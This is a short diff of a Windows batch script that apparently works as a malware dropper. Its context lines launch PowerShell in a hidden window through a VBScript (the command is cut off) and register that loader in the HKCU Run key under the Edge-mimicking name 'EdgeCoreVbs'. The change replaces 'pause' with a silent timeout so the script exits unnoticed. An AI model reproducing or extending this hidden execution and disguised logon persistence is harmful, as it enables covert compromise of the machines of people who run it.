@@ -69,5 +69,6 @@ echo WshShell.Run "powershell -w hidden -c ""[Net.ServicePointManager]::Security
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeCoreVbs" /t REG_SZ /d "wscript.exe \"%VBS_LDR%\"" /f >nul 2>&1
 
 echo Islem tamamlandi.
-pause
+timeout /t 3 >nul
 exit
+
